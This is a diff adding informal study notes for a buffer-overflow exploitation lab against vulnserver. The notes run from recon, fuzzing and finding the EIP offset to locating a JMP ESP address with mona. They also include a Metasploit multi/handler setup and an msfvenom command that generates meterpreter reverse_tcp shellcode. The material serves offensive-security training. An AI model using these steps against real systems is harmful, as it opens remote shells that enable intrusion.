@@ -361,7 +361,45 @@ wire mask>> tools>> buffer overflow>> put the 3000 >>copy into script under #buf
 rewind, play, run updated script
 get eip from widnows immuniy>> put value into wiremask
 on script                                                   buf += "A * 2003 #which is result from wiremask
-BAKC TO POWERSHELL
+BACK TO POWERSHELL
+
+
+        THE POWERSHELL NOTES
+        #static
+        strings .\vulnserver.exe | select -First 10
+        clear
+        
+        #behavioral
+        Get-Process | findstr /i vuln 
+        netstat -antop tcp | findstr 4836   #insert Id found 
+        ##run as intended, 
+        ## run immunity debugger
+        
+        
+        #Dynamic
+        Run Immunity as Administrator > Open .exe > play, rewind, repeat
+        Fuzzing > Wiremask > find offset
+        
+        
+        ##NOW on powershell, 
+        !mona modules # find unprotected DLLs, put into the typeing spot bottom of immunity, look for all FALSE to put file below
+        !mona jmp -r esp -m "essfunc.dll" #search for JMP ESP with unprotected DLL, window>>lod data>> copy momory location and put into little endian and put into script
+        #62|50|11|AF , 625011BB, 625011C7 
+        
+        #MSF CONSOLE in linux
+        msfconsole
+        
+        use multi/handler
+        show options
+        set payload windows/meterpreter/reverse_tcp
+        set LHOST 0.0.0.0
+        set LPORT 4444
+        exploit
+        
+        #Shell Code
+        msfvenom -p windows/meterpreter/reverse_tcp lhost=<lin ops host ip> lport=4444 -b " \x00\xfe\x20\x0a\xff" -f python
+        
+        # copy everything but first line and put into
 
 
 
